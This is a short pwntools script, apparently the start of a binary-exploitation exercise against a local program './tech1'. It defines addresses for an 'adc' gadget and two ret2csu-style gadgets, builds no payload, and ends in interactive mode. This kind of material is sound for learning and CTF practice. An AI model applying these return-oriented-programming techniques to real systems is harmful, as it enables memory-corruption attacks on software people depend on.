from pwn import *
p = process('./tech1')
adc_gadget = 0x400518 		#adc [rbp+0x48],edx
return_to_csu1 = 0x4005d6	# -8,bx,bp,12,13,14,15
return_to_csu2 = 0x4005c0	# call [r12+rbx*8]


p.interactive()
